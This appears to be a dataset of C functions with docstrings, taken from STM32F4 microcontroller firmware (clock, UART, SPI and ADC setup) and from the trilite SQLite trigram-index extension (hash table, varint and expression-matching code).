{"docstring": "/**\n  * @brief  Enables or disables the VBAT (Voltage Battery) channel.\n  * \n  * @note   the Battery voltage measured is equal to VBAT/2 on STM32F40xx and \n  *         STM32F41xx devices and equal to VBAT/4 on STM32F42xx and STM32F43xx devices \n  *              \n  * @param  NewState: new state of the VBAT channel.\n  *          This parameter can be: ENABLE or DISABLE.\n  * @retval None\n  */\n", "func_signal": "void ADC_VBATCmd(FunctionalState NewState)", "code": "{\n  /* Check the parameters */\n  assert_param(IS_FUNCTIONAL_STATE(NewState));\n  if (NewState != DISABLE)\n  {\n    /* Enable the VBAT channel*/\n    ADC->CCR |= (uint32_t)ADC_CCR_VBATE;\n  }\n  else\n  {\n    /* Disable the VBAT channel*/\n    ADC->CCR &= (uint32_t)(~ADC_CCR_VBATE);\n  }\n}", "path": "Firmware\\Libraries\\STM32F4xx_StdPeriph_Driver\\src\\stm32f4xx_adc.c", "repo_name": "x893/CarTracker", "stars": 73, "license": "None", "language": "c", "size": 3237}
{"docstring": "//-------------------------------------------------------------------\n", "func_signal": "void uart_string ( const char *s )", "code": "{\n    for(;*s;s++)\n    {\n        if(*s==0x0A) uart_putc(0x0D);\n        uart_putc(*s);\n    }\n}", "path": "uart02\\uart02.c", "repo_name": "dwelch67/stm32f4d", "stars": 65, "license": "None", "language": "c", "size": 305}
{"docstring": "//-------------------------------------------------------------------\n", "func_signal": "void uart_putc ( unsigned int x )", "code": "{\n    while (( GET32(USART2_SR) & (1<<7)) == 0) continue;\n    PUT32(USART2_DR,x);\n}", "path": "spi01\\spi01.c", "repo_name": "dwelch67/stm32f4d", "stars": 65, "license": "None", "language": "c", "size": 305}
{"docstring": "//-------------------------------------------------------------------\n", "func_signal": "int notmain ( void )", "code": "{\n    unsigned int ra;\n    unsigned int spi_shift_out;\n    unsigned int spi_shift_in;\n    unsigned int spi_shift_count;\n\nASM_DELAY(10000);\n    clock_init();\n    uart_init();\n\n    //ra=GET32(RCC_APB1ENR);\n    //ra|=1<<3; //enable TIM5\n    //PUT32(RCC_APB1ENR,ra);\n\n    //PUT32(TIM5BASE+0x00,0x00000000);\n    //PUT32(TIM5BASE+0x2C,50);\n    //PUT32(TIM5BASE+0x00,0x00000001);\n\n    ra=GET32(RCC_AHB1ENR);\n    ra|=1<<0; //enable port A\n    ra|=1<<4; //enable port E\n    PUT32(RCC_AHB1ENR,ra);\n\n    //PA5 SCK out\n    //PA6 MISO in\n    //PA7 MOSI out\n    //PE3 CS out\n\n    ra=GET32(GPIOA_MODER);\n    ra&=~(3<<(5<<1)); //PA5\n    ra|= (1<<(5<<1)); //PA5 output\n    ra&=~(3<<(6<<1)); //PA6\n    ra|= (0<<(6<<1)); //PA6 input\n    ra&=~(3<<(7<<1)); //PA7\n    ra|= (1<<(7<<1)); //PA7 output\n    PUT32(GPIOA_MODER,ra);\n\n    ra=GET32(GPIOA_OTYPER);\n    ra&=~(1<<5); //PA5 push-pull\n    ra&=~(1<<7); //PA7 push-pull\n    PUT32(GPIOA_OTYPER,ra);\n\n    ra=GET32(GPIOA_PUPDR);\n    ra&=~(3<<(6<<1)); //PA6\n    ra|= (2<<(6<<1)); //PA6 pull down\n    //ra|= (0<<(6<<1)); //PA6\n    PUT32(GPIOA_PUPDR,ra);\n\n    ra=GET32(GPIOE_MODER);\n    ra&=~(3<<(3<<1)); //PE3\n    ra|= (1<<(3<<1)); //PE3 output\n    PUT32(GPIOE_MODER,ra);\n\n    ra=GET32(GPIOE_OTYPER);\n    ra&=~(1<<3); //PE3 push-pull\n    PUT32(GPIOE_OTYPER,ra);\n\n    hexstring(GET32(GPIOA_MODER),1);\n    hexstring(GET32(GPIOA_OTYPER),1);\n    hexstring(GET32(GPIOA_PUPDR),1);\n    hexstring(GET32(GPIOE_MODER),1);\n    hexstring(GET32(GPIOE_OTYPER),1);\n\n    CS_HIGH;\n    SCK_HIGH;\n    MOSI_HIGH;\n\n//mosi is sampled on rising edge\n//miso changes on falling edge\n\n    hexstring(0x1234,1);\n\n    spi_shift_out=0x2047;\n\n    CS_LOW;\n    timdelay();\n    timdelay();\n    spi_shift_count=16;\n    while(spi_shift_count--)\n    {\n        SCK_LOW;\n        timdelay();\n        if(spi_shift_out&0x8000) MOSI_HIGH; else MOSI_LOW;\n        timdelay();\n        SCK_HIGH;\n        timdelay();\n        spi_shift_out<<=1;\n        timdelay();\n    }\n    CS_HIGH;\n\n    hexstring(0x1234,1);\n\n\n    ASM_DELAY(250000);\n\n\n    spi_shift_out=0x8F;\n\n    CS_LOW;\n    timdelay();\n    timdelay();\n    spi_shift_count=8;\n    while(spi_shift_count--)\n    {\n        SCK_LOW;\n        timdelay();\n        if(spi_shift_out&0x80) MOSI_HIGH; else MOSI_LOW;\n        timdelay();\n        SCK_HIGH;\n        timdelay();\n        spi_shift_out<<=1;\n        timdelay();\n    }\n    spi_shift_in=0;\n    spi_shift_count=8;\n    while(spi_shift_count--)\n    {\n        SCK_LOW;\n        timdelay();\n        spi_shift_in<<=1;\n        if(GET32(GPIOA_IDR)&(1<<6)) spi_shift_in|=1;\n        timdelay();\n        SCK_HIGH;\n        timdelay();\n        timdelay();\n    }\n    CS_HIGH;\n\n    hexstring(0x1234,1);\n    hexstring(spi_shift_in,1);\n\n\n\n    spi_shift_out=0xA0;\n\n    CS_LOW;\n    timdelay();\n    timdelay();\n    spi_shift_count=8;\n    while(spi_shift_count--)\n    {\n        SCK_LOW;\n        timdelay();\n        if(spi_shift_out&0x80) MOSI_HIGH; else MOSI_LOW;\n        timdelay();\n        SCK_HIGH;\n        timdelay();\n        spi_shift_out<<=1;\n        timdelay();\n    }\n    spi_shift_in=0;\n    spi_shift_count=8;\n    while(spi_shift_count--)\n    {\n        SCK_LOW;\n        timdelay();\n        spi_shift_in<<=1;\n        if(GET32(GPIOA_IDR)&(1<<6)) spi_shift_in|=1;\n        timdelay();\n        SCK_HIGH;\n        timdelay();\n        timdelay();\n    }\n    CS_HIGH;\n\n    hexstring(0x1234,1);\n    hexstring(spi_shift_in,1);\n\n    hexstring(spi_read_register(0x23),1);\n\n\n    while(1)\n    {\n        hexstring(spi_read_register(0x27),0);\n        hexstring(spi_read_register(0x0F),0);\n        hexstring(spi_read_register(0x29),0);\n        hexstring(spi_read_register(0x2B),0);\n        hexstring(spi_read_register(0x2D),1);\n    }\n    //uart_string(\"\\nHello World!\\n\");\n    //hexstring(spi_shift_in,1);\n\n    return(0);\n}", "path": "spi01\\spi01.c", "repo_name": "dwelch67/stm32f4d", "stars": 65, "license": "None", "language": "c", "size": 305}
{"docstring": "//-------------------------------------------------------------------\n", "func_signal": "void uart_putc ( unsigned int x )", "code": "{\n    while (( GET32(USART2_SR) & (1<<7)) == 0) continue;\n    PUT32(USART2_DR,x);\n}", "path": "uart02\\uart02.c", "repo_name": "dwelch67/stm32f4d", "stars": 65, "license": "None", "language": "c", "size": 305}
{"docstring": "//main clock 168MHz\n//PPRE1 divide by 8 = 21MHz\n//21000000/9600 = 2187.5\n//  2187/16 = 136.6875\n// .6875*16 = 11\n// divisor 136 fractional divisor 11\n// 21000000/2187 = 9602\n//-------------------------------------------------------------------\n", "func_signal": "void clock_init ( void )", "code": "{\n    unsigned int ra;\n\n    //enable HSE\n    ra=GET32(RCC_CR);\n    ra&=~(0xF<<16);\n    PUT32(RCC_CR,ra);\n    ra|=1<<16;\n    PUT32(RCC_CR,ra);\n    while(1)\n    {\n        if(GET32(RCC_CR)&(1<<17)) break;\n    }\n    PUT32(RCC_CFGR,0x0000D801); //PPRE2 /2 PPRE1 /8 sw=hse\n    //slow flash accesses down otherwise it will crash\n    PUT32(FLASH_ACR,0x00000105);\n    //8MHz HSE, 168MHz pllgen 48MHz pll usb\n    //Q 7 P 2 N 210 M 5 vcoin 1 pllvco 336 pllgen 168 pllusb 48\n    ra=(7<<24)|(1<<22)|(((2>>1)-1)<<16)|(210<<6)|(5<<0);\n    PUT32(RCC_PLLCFGR,ra);\n    // enable pll\n    ra=GET32(RCC_CR);\n    ra|=(1<<24);\n    PUT32(RCC_CR,ra);\n    //wait for pll lock\n    while(1)\n    {\n        if(GET32(RCC_CR)&(1<<25)) break;\n    }\n    //select pll\n    PUT32(RCC_CFGR,0x0000D802); //PPRE2 /2 PPRE1 /8 sw=pllclk\n    //if you didnt set the flash wait states you may crash here\n    //wait for it to use the pll\n    while(1)\n    {\n        if((GET32(RCC_CFGR)&0xC)==0x8) break;\n    }\n }\n//-------------------------------------------------------------------\nint uart_init ( void )\n{\n    unsigned int ra;\n\n    ra=GET32(RCC_AHB1ENR);\n    ra|=1<<0; //enable port A\n    PUT32(RCC_AHB1ENR,ra);\n\n    ra=GET32(RCC_APB1ENR);\n    ra|=1<<17;  //enable USART2\n    PUT32(RCC_APB1ENR,ra);\n\n    //PA2 USART2_TX\n\n    ra=GET32(GPIOA_MODER);\n    ra|= (2<<4);\n    PUT32(GPIOA_MODER,ra);\n    ra=GET32(GPIOA_OTYPER);\n    ra&=(1<<2);\n    PUT32(GPIOA_OTYPER,0);\n    ra=GET32(GPIOA_AFRL);\n    ra|=(7<<8);\n    PUT32(GPIOA_AFRL,ra);\n\n    // divisor 136 fractional divisor 11\n    PUT32(USART2_BRR,(136<<4)|(11<<0));\n    PUT32(USART2_CR1,(1<<13)|(1<<3));\n    return(0);\n}", "path": "uart02\\uart02.c", "repo_name": "dwelch67/stm32f4d", "stars": 65, "license": "None", "language": "c", "size": 305}
{"docstring": "//-------------------------------------------------------------------\n", "func_signal": "void hexstring ( unsigned int d, unsigned int cr )", "code": "{\n    //unsigned int ra;\n    unsigned int rb;\n    unsigned int rc;\n\n    rb=32;\n    while(1)\n    {\n        rb-=4;\n        rc=(d>>rb)&0xF;\n        if(rc>9) rc+=0x37; else rc+=0x30;\n        uart_putc(rc);\n        if(rb==0) break;\n    }\n    if(cr)\n    {\n        uart_putc(0x0D);\n        uart_putc(0x0A);\n    }\n    else\n    {\n        uart_putc(0x20);\n    }\n}", "path": "uart02\\uart02.c", "repo_name": "dwelch67/stm32f4d", "stars": 65, "license": "None", "language": "c", "size": 305}
{"docstring": "//-------------------------------------------------------------------\n", "func_signal": "void clock_init ( void )", "code": "{\n    unsigned int ra;\n\n    //enable HSE\n    ra=GET32(RCC_CR);\n    ra&=~(0xF<<16);\n    PUT32(RCC_CR,ra);\n    ra|=1<<16;\n    PUT32(RCC_CR,ra);\n    while(1)\n    {\n        if(GET32(RCC_CR)&(1<<17)) break;\n    }\n    PUT32(RCC_CFGR,0x0000B401); //PPRE2 /4 PPRE1 /4 sw=hse\n    //slow flash accesses down otherwise it will crash\n    PUT32(FLASH_ACR,0x00000105);\n    //8MHz HSE, 168MHz pllgen 48MHz pll usb\n    //Q 7 P 2 N 210 M 5 vcoin 1 pllvco 336 pllgen 168 pllusb 48\n    ra=(7<<24)|(1<<22)|(((2>>1)-1)<<16)|(210<<6)|(5<<0);\n    PUT32(RCC_PLLCFGR,ra);\n    // enable pll\n    ra=GET32(RCC_CR);\n    ra|=(1<<24);\n    PUT32(RCC_CR,ra);\n    //wait for pll lock\n    while(1)\n    {\n        if(GET32(RCC_CR)&(1<<25)) break;\n    }\n    //select pll\n    PUT32(RCC_CFGR,0x0000B402); //PPRE2 /4 PPRE1 /4 sw=pllclk\n    //if you didnt set the flash wait states you may crash here\n    //wait for it to use the pll\n    while(1)\n    {\n        if((GET32(RCC_CFGR)&0xC)==0x8) break;\n    }\n }\n//-------------------------------------------------------------------\nint uart_init ( void )\n{\n    unsigned int ra;\n\n    ra=GET32(RCC_AHB1ENR);\n    ra|=1<<0; //enable port A\n    PUT32(RCC_AHB1ENR,ra);\n\n    ra=GET32(RCC_APB1ENR);\n    ra|=1<<17;  //enable USART2\n    PUT32(RCC_APB1ENR,ra);\n\n    //PA2 USART2_TX\n    //PA3 USART2_RX\n\n    ra=GET32(GPIOA_MODER);\n    ra|= (2<<4);\n    ra|= (2<<6);\n    PUT32(GPIOA_MODER,ra);\n    ra=GET32(GPIOA_OTYPER);\n    ra&=(1<<2);\n    ra&=(1<<3);\n    PUT32(GPIOA_OTYPER,ra);\n    ra=GET32(GPIOA_AFRL);\n    ra|=(7<<8);\n    ra|=(7<<12);\n    PUT32(GPIOA_AFRL,ra);\n\n    //42000000/16 = 2625000\n    //2625000/115200 = 22.786...\n    //.786... * 16 = 12.58\n    //12/16 = 0.75\n    //13/16 = 0.8125\n    //2625000/22.75 = 115384 184  .16%\n    //2625000/22.8125 = 115068 132  .11%\n    PUT32(USART2_BRR,(22<<4)|(13<<0));\n    PUT32(USART2_CR1,(1<<13)|(1<<3)|(1<<2));\n    return(0);\n}", "path": "uart04\\uart04.c", "repo_name": "dwelch67/stm32f4d", "stars": 65, "license": "None", "language": "c", "size": 305}
{"docstring": "//-------------------------------------------------------------------\n", "func_signal": "unsigned int uart_getc ( void )", "code": "{\n    while (( GET32(USART2_SR) & (1<<5)) == 0) continue;\n    return(GET32(USART2_DR));\n}", "path": "uart04\\uart04.c", "repo_name": "dwelch67/stm32f4d", "stars": 65, "license": "None", "language": "c", "size": 305}
{"docstring": "//-------------------------------------------------------------------\n", "func_signal": "void timdelay ( void )", "code": "{\n    unsigned int ra;\n    unsigned int rb;\n\n    rb=GET32(TIM5BASE+0x24);\n    while(1)\n    {\n        ra=GET32(TIM5BASE+0x24);\n        if((ra-rb)>=((168000000*2)/8)) break;\n    }\n}", "path": "uart04\\uart04.c", "repo_name": "dwelch67/stm32f4d", "stars": 65, "license": "None", "language": "c", "size": 305}
{"docstring": "//-------------------------------------------------------------------\n", "func_signal": "void uart_putc ( unsigned int x )", "code": "{\n    while (( GET32(USART2_SR) & (1<<7)) == 0) continue;\n    PUT32(USART2_DR,x);\n}", "path": "uart04\\uart04.c", "repo_name": "dwelch67/stm32f4d", "stars": 65, "license": "None", "language": "c", "size": 305}
{"docstring": "//-------------------------------------------------------------------\n", "func_signal": "int notmain ( void )", "code": "{\n    unsigned int ra;\n    clock_init();\n    uart_init();\n\n    uart_string(\"\\nHello World!\\n\");\n    while(1)\n    {\n        ra=uart_getc();\n        uart_putc(ra);\n        if(ra==0x0D) uart_putc(0x0A);\n    }\n    return(0);\n}", "path": "uart04\\uart04.c", "repo_name": "dwelch67/stm32f4d", "stars": 65, "license": "None", "language": "c", "size": 305}
{"docstring": "//-------------------------------------------------------------------\n", "func_signal": "void uart_string ( const char *s )", "code": "{\n    for(;*s;s++)\n    {\n        if(*s==0x0A) uart_putc(0x0D);\n        uart_putc(*s);\n    }\n}", "path": "uart04\\uart04.c", "repo_name": "dwelch67/stm32f4d", "stars": 65, "license": "None", "language": "c", "size": 305}
{"docstring": "//-------------------------------------------------------------------\n", "func_signal": "void clock_init ( void )", "code": "{\n    unsigned int ra;\n\n    //enable HSE\n    ra=GET32(RCC_CR);\n    ra&=~(0xF<<16);\n    PUT32(RCC_CR,ra);\n    ra|=1<<16;\n    PUT32(RCC_CR,ra);\n    while(1)\n    {\n        if(GET32(RCC_CR)&(1<<17)) break;\n    }\n    PUT32(RCC_CFGR,0x00000001);\n}", "path": "spi01\\spi01.c", "repo_name": "dwelch67/stm32f4d", "stars": 65, "license": "None", "language": "c", "size": 305}
{"docstring": "//-------------------------------------------------------------------\n", "func_signal": "void hexstring ( unsigned int d, unsigned int cr )", "code": "{\n    //unsigned int ra;\n    unsigned int rb;\n    unsigned int rc;\n\n    rb=32;\n    while(1)\n    {\n        rb-=4;\n        rc=(d>>rb)&0xF;\n        if(rc>9) rc+=0x37; else rc+=0x30;\n        uart_putc(rc);\n        if(rb==0) break;\n    }\n    if(cr)\n    {\n        uart_putc(0x0D);\n        uart_putc(0x0A);\n    }\n    else\n    {\n        uart_putc(0x20);\n    }\n}", "path": "uart04\\uart04.c", "repo_name": "dwelch67/stm32f4d", "stars": 65, "license": "None", "language": "c", "size": 305}
{"docstring": "//-------------------------------------------------------------------\n", "func_signal": "unsigned int spi_read_register ( unsigned int reg )", "code": "{\n    unsigned int spi_shift_out;\n    unsigned int spi_shift_in;\n    unsigned int spi_shift_count;\n\n    spi_shift_out=0x80|reg;\n\n    CS_LOW;\n    timdelay();\n    timdelay();\n    spi_shift_count=8;\n    while(spi_shift_count--)\n    {\n        SCK_LOW;\n        timdelay();\n        if(spi_shift_out&0x80) MOSI_HIGH; else MOSI_LOW;\n        timdelay();\n        SCK_HIGH;\n        timdelay();\n        spi_shift_out<<=1;\n        timdelay();\n    }\n    spi_shift_in=0;\n    spi_shift_count=8;\n    while(spi_shift_count--)\n    {\n        SCK_LOW;\n        timdelay();\n        spi_shift_in<<=1;\n        if(GET32(GPIOA_IDR)&(1<<6)) spi_shift_in|=1;\n        timdelay();\n        SCK_HIGH;\n        timdelay();\n        timdelay();\n    }\n    CS_HIGH;\n    return(spi_shift_in);\n}", "path": "spi01\\spi01.c", "repo_name": "dwelch67/stm32f4d", "stars": 65, "license": "None", "language": "c", "size": 305}
{"docstring": "//-------------------------------------------------------------------\n", "func_signal": "void timdelay ( void )", "code": "{\n    unsigned int ra;\n    unsigned int rb;\n\n    rb=GET32(TIM5BASE+0x24);\n    while(1)\n    {\n        ra=GET32(TIM5BASE+0x24);\n        if((ra-rb)>=((168000000*2)/8)) break;\n    }\n}", "path": "uart02\\uart02.c", "repo_name": "dwelch67/stm32f4d", "stars": 65, "license": "None", "language": "c", "size": 305}
{"docstring": "//-------------------------------------------------------------------\n", "func_signal": "int notmain ( void )", "code": "{\n    clock_init();\n    uart_init();\n\n    uart_string(\"\\nHello World!\\n\");\n    hexstring(0x12345678,0); hexstring(0x87654321,1);\n\n    return(0);\n}", "path": "uart02\\uart02.c", "repo_name": "dwelch67/stm32f4d", "stars": 65, "license": "None", "language": "c", "size": 305}
{"docstring": "//-------------------------------------------------------------------\n", "func_signal": "unsigned int uart_getc ( void )", "code": "{\n    while (( GET32(USART2_SR) & (1<<5)) == 0) continue;\n    return(GET32(USART2_DR));\n}", "path": "spi01\\spi01.c", "repo_name": "dwelch67/stm32f4d", "stars": 65, "license": "None", "language": "c", "size": 305}
{"docstring": "//-------------------------------------------------------------------\n", "func_signal": "void hexstring ( unsigned int d, unsigned int cr )", "code": "{\n    //unsigned int ra;\n    unsigned int rb;\n    unsigned int rc;\n\n    rb=32;\n    while(1)\n    {\n        rb-=4;\n        rc=(d>>rb)&0xF;\n        if(rc>9) rc+=0x37; else rc+=0x30;\n        uart_putc(rc);\n        if(rb==0) break;\n    }\n    if(cr)\n    {\n        uart_putc(0x0D);\n        uart_putc(0x0A);\n    }\n    else\n    {\n        uart_putc(0x20);\n    }\n}", "path": "spi01\\spi01.c", "repo_name": "dwelch67/stm32f4d", "stars": 65, "license": "None", "language": "c", "size": 305}
{"docstring": "//-------------------------------------------------------------------\n", "func_signal": "void uart_string ( const char *s )", "code": "{\n    for(;*s;s++)\n    {\n        if(*s==0x0A) uart_putc(0x0D);\n        uart_putc(*s);\n    }\n}", "path": "spi01\\spi01.c", "repo_name": "dwelch67/stm32f4d", "stars": 65, "license": "None", "language": "c", "size": 305}
{"docstring": "/** Find entry and previous entry for a trigram\n * Returns true, if an entry was found.\n * Entry is output as *ppEntry, previous entry is output as *ppPrevEntry,\n * if no entry is found *ppPrevEntry points to the last entry in list for\n * the key, or NULL if none.\n */\n", "func_signal": "static bool findEntry(hash_table *pTable, trilite_trigram trigram, hash_entry **ppEntry, hash_entry **ppPrevEntry)", "code": "{\n  assert(ppEntry && ppPrevEntry);\n  *ppPrevEntry  = NULL;\n  *ppEntry      = pTable->keys[COMPUTE_HASH(trigram)];\n  while(*ppEntry){\n    if((*ppEntry)->trigram == trigram)\n      return true;\n    *ppPrevEntry  = *ppEntry;\n    *ppEntry      = (*ppEntry)->next;\n  }\n  return false;\n}", "path": "hash.c", "repo_name": "jonasfj/trilite", "stars": 75, "license": "None", "language": "c", "size": 631}
{"docstring": "/** Release hash table cursor */\n", "func_signal": "void hashClose(hash_table_cursor *pCur)", "code": "{\n  /* Release anything waiting for release */\n  if(pCur->pDelete){\n    sqlite3_free(pCur->pDelete);\n    pCur->pDelete = NULL;\n  }\n  /* Release the cursor */\n  sqlite3_free(pCur);\n  pCur = NULL;\n}", "path": "hash.c", "repo_name": "jonasfj/trilite", "stars": 75, "license": "None", "language": "c", "size": 631}
{"docstring": "/** Allocate and open a hash table cursor */\n", "func_signal": "int hashOpen(hash_table *pTable, hash_table_cursor **ppCur)", "code": "{\n  *ppCur = (hash_table_cursor*)sqlite3_malloc(sizeof(hash_table_cursor));\n  if(!*ppCur) return SQLITE_NOMEM;\n  (*ppCur)->iOffset = 0;\n  (*ppCur)->pDelete = NULL;\n  (*ppCur)->pTable  = pTable;\n  return SQLITE_OK;\n}", "path": "hash.c", "repo_name": "jonasfj/trilite", "stars": 75, "license": "None", "language": "c", "size": 631}
{"docstring": "/** Release resources held by expression */\n", "func_signal": "void exprRelease(expr *pExpr)", "code": "{\n  if(!pExpr) return;\n  if(pExpr->eType & EXPR_OP){\n    exprRelease(pExpr->expr.op.expr1);\n    pExpr->expr.op.expr1 = NULL;\n    exprRelease(pExpr->expr.op.expr2);\n    pExpr->expr.op.expr2 = NULL;\n  }\n  sqlite3_free(pExpr);\n}", "path": "expr.c", "repo_name": "jonasfj/trilite", "stars": 75, "license": "None", "language": "c", "size": 631}
{"docstring": "/** Write an integer in varint encoding to pBuf\n * Returns number of bytes written */\n", "func_signal": "int writeVarInt(unsigned char *pBuf, sqlite3_int64 input)", "code": "{\n  /* Write byte 0 */\n  pBuf[0] = ((unsigned char)input) & ~VARINT_END_BITMASK;\n  input = input >> 7;\n  if(input == 0){ pBuf[0] |= VARINT_END_BITMASK; return 1;}\n  /* Write byte 1 */\n  pBuf[1] = ((unsigned char)input) & ~VARINT_END_BITMASK;\n  input = input >> 7;\n  if(input == 0){ pBuf[1] |= VARINT_END_BITMASK; return 2;}\n  /* Write byte 2 */\n  pBuf[2] = ((unsigned char)input) & ~VARINT_END_BITMASK;\n  input = input >> 7;\n  if(input == 0){ pBuf[2] |= VARINT_END_BITMASK; return 3;}\n  /* Write byte 3 */\n  pBuf[3] = ((unsigned char)input) & ~VARINT_END_BITMASK;\n  input = input >> 7;\n  if(input == 0){ pBuf[3] |= VARINT_END_BITMASK; return 4;}\n  /* Write byte 4 */\n  pBuf[4] = ((unsigned char)input) & ~VARINT_END_BITMASK;\n  input = input >> 7;\n  if(input == 0){ pBuf[4] |= VARINT_END_BITMASK; return 5;}\n  /* Write byte 5 */\n  pBuf[5] = ((unsigned char)input) & ~VARINT_END_BITMASK;\n  input = input >> 7;\n  if(input == 0){ pBuf[5] |= VARINT_END_BITMASK; return 6;}\n  /* Write byte 6 */\n  pBuf[6] = ((unsigned char)input) & ~VARINT_END_BITMASK;\n  input = input >> 7;\n  if(input == 0){ pBuf[6] |= VARINT_END_BITMASK; return 7;}\n  /* Write byte 7 */\n  pBuf[7] = ((unsigned char)input) & ~VARINT_END_BITMASK;\n  input = input >> 7;\n  if(input == 0){ pBuf[7] |= VARINT_END_BITMASK; return 8;}\n  /* Write byte 8 (starting from 0) */\n  pBuf[8] = ((unsigned char)input);\n  return 9;\n}", "path": "varint.c", "repo_name": "jonasfj/trilite", "stars": 75, "license": "None", "language": "c", "size": 631}
{"docstring": "/** Release all resources held by the hash table */\n", "func_signal": "void hashRelease(hash_table *pTable)", "code": "{\n  int i;\n  for(i = 0; i < HASH_TABLE_ENTRIES; i++){\n    hash_entry *pEntry = pTable->keys[i];\n    while(pEntry){\n      hash_entry *pPrevEntry = pEntry;\n      pEntry = pEntry->next;\n      sqlite3_free(pPrevEntry);\n    }\n  }\n  sqlite3_free(pTable);\n}", "path": "hash.c", "repo_name": "jonasfj/trilite", "stars": 75, "license": "None", "language": "c", "size": 631}
{"docstring": "/** Allocate a new hash table, output it to ppTable */\n", "func_signal": "int hashCreate(hash_table** ppTable)", "code": "{\n  *ppTable = (hash_table*)sqlite3_malloc(sizeof(hash_table));\n  if(!*ppTable) return SQLITE_NOMEM;\n  memset(*ppTable, 0, sizeof(hash_table));\n  (*ppTable)->memory = 0;\n  return SQLITE_OK;\n}", "path": "hash.c", "repo_name": "jonasfj/trilite", "stars": 75, "license": "None", "language": "c", "size": 631}
{"docstring": "/** Parse a sequence of patterns that must hold into a single expression\n * Return *ppExpr = NULL and *pAll = true, if a full table scan is required\n * if *ppExpr = NULL and *pAll = false, implies that nothing matches the\n * patterns, ie. resultset is empty! */\n", "func_signal": "int exprParsePatterns(expr **ppExpr, bool *pAll, trilite_vtab *pTrgVtab, int argc, sqlite3_value **argv)", "code": "{\n  int rc = SQLITE_OK;\n  *ppExpr = NULL;\n  /* For each pattern add it to the others with a AND */\n  int i;\n  for(i = 0; i < argc; i++){\n    const unsigned char* pattern  = sqlite3_value_text(argv[i]);\n    int                  nPattern = sqlite3_value_bytes(argv[i]);\n    expr *pExpr;\n    rc = exprParse(&pExpr, pAll, pTrgVtab, pattern, nPattern);\n    /* Release and return on error, error message is already set */\n    if(rc != SQLITE_OK) goto abort;\n    /* If one of the and conditions fails, we're done */\n    if(!pExpr && !*pAll) goto abort;\n    /* If matches all continue */\n    if(!pExpr && *pAll) continue;\n    /* Combine with an AND */\n    if(*ppExpr)\n      rc = exprOperator(ppExpr, *ppExpr, pExpr, EXPR_AND);\n    else\n      *ppExpr = pExpr;\n    if(rc != SQLITE_OK) goto abort;\n  }\n  /* We didn't get anything, we would have aborted before this */\n  /* unless, everything is accepted! */\n  if(!*ppExpr) *pAll = true;\n  return rc;\nabort:\n  *pAll = false;\n  exprRelease(*ppExpr);\n  *ppExpr = NULL;\n  return rc;\n}", "path": "expr.c", "repo_name": "jonasfj/trilite", "stars": 75, "license": "None", "language": "c", "size": 631}
{"docstring": "/** Check if id is a result and move to next id\n * Set ppExpr = NULL, if at end */\n", "func_signal": "static bool exprCheckAndMove(expr **ppExpr, sqlite3_int64 id)", "code": "{\n  assert(ppExpr && *ppExpr);\n  if((*ppExpr)->eType & EXPR_OP){\n    bool r1 = exprCheckAndMove(&(*ppExpr)->expr.op.expr1, id);\n    bool r2 = exprCheckAndMove(&(*ppExpr)->expr.op.expr2, id);\n    if((*ppExpr)->eType == EXPR_AND){\n      /* If one of them is at end, we're done */\n      if(!(*ppExpr)->expr.op.expr1 || !(*ppExpr)->expr.op.expr2){\n        exprRelease((*ppExpr)->expr.op.expr1);\n        exprRelease((*ppExpr)->expr.op.expr2);\n        sqlite3_free(*ppExpr);\n        *ppExpr = NULL;\n      }\n      return r1 && r2;\n    }\n    assert((*ppExpr)->eType == EXPR_OR);\n    if(!(*ppExpr)->expr.op.expr1 && !(*ppExpr)->expr.op.expr2){\n      sqlite3_free(*ppExpr);\n      *ppExpr = NULL;\n    }else if(!(*ppExpr)->expr.op.expr1){\n      expr* expr2 = (*ppExpr)->expr.op.expr2;\n      sqlite3_free(*ppExpr);\n      *ppExpr = expr2;\n    }else if(!(*ppExpr)->expr.op.expr2){\n      expr* expr1 = (*ppExpr)->expr.op.expr1;\n      sqlite3_free(*ppExpr);\n      *ppExpr = expr1;\n    }\n    return r1 || r2;\n  }else{\n    assert((*ppExpr)->eType == EXPR_TRIGRAM);\n    while((*ppExpr)->expr.trigram.nSize > 0 && (*ppExpr)->expr.trigram.curId < id){\n      sqlite3_int64 prev = (*ppExpr)->expr.trigram.curId;\n      int read = readVarInt((*ppExpr)->expr.trigram.docList, &(*ppExpr)->expr.trigram.curId);\n      (*ppExpr)->expr.trigram.curId   += prev;\n      (*ppExpr)->expr.trigram.nSize   -= read;\n      (*ppExpr)->expr.trigram.docList += read;\n    }\n    bool retval = (*ppExpr)->expr.trigram.curId == id;\n    /* Check if we have to move forward */\n    if((*ppExpr)->expr.trigram.curId <= id){\n      /* If we can't we're at the end and done */\n      if((*ppExpr)->expr.trigram.nSize == 0){\n        sqlite3_free(*ppExpr);\n        *ppExpr = NULL;\n      }else{\n        sqlite3_int64 prev = (*ppExpr)->expr.trigram.curId;\n        int read = readVarInt((*ppExpr)->expr.trigram.docList, &(*ppExpr)->expr.trigram.curId);\n        (*ppExpr)->expr.trigram.curId   += prev;\n        (*ppExpr)->expr.trigram.nSize   -= read;\n        (*ppExpr)->expr.trigram.docList += read;\n      }\n    }\n    return retval;\n  }\n}", "path": "expr.c", "repo_name": "jonasfj/trilite", "stars": 75, "license": "None", "language": "c", "size": 631}
{"docstring": "/** Return and remove the next trigram and doclist\n * Returns false, if at end of hash table\n * The trigram is returned as *pTrigram, list of ids as *ids, and length of *pIds\n * as *nIds. Pointers will be deallocated on next call to either hashPop or\n * hashClose.\n */\n", "func_signal": "bool hashPop(hash_table_cursor *pCur,\n             trilite_trigram *pTrigram, sqlite3_int64 **pIds, int *nIds)", "code": "{\n  /* Release anything waiting for release */\n  if(pCur->pDelete){\n    sqlite3_free(pCur->pDelete);\n    pCur->pDelete = NULL;\n  }\n\n  /* Find next offset where there is something */\n  while(pCur->iOffset < HASH_TABLE_ENTRIES && !pCur->pTable->keys[pCur->iOffset])\n    pCur->iOffset++;\n\n  /* If there was nothing return false */\n  if(pCur->iOffset >= HASH_TABLE_ENTRIES)\n    return false;\n\n  /* Set the entry we wish to delete */\n  pCur->pDelete = pCur->pTable->keys[pCur->iOffset];\n  /* Remove it from the hash table */\n  pCur->pTable->keys[pCur->iOffset] = pCur->pDelete->next;\n\n  /* Update memory usage */\n  pCur->pTable->memory -= sizeof(hash_entry) + (pCur->pDelete->nDocList + pCur->pDelete->nSizeAvail) * sizeof(sqlite3_int64);\n\n  /* Set return values */\n  *pTrigram = pCur->pDelete->trigram;\n  *pIds     = DOCLIST(pCur->pDelete);\n  *nIds     = pCur->pDelete->nDocList;\n  return true; \n}", "path": "hash.c", "repo_name": "jonasfj/trilite", "stars": 75, "license": "None", "language": "c", "size": 631}
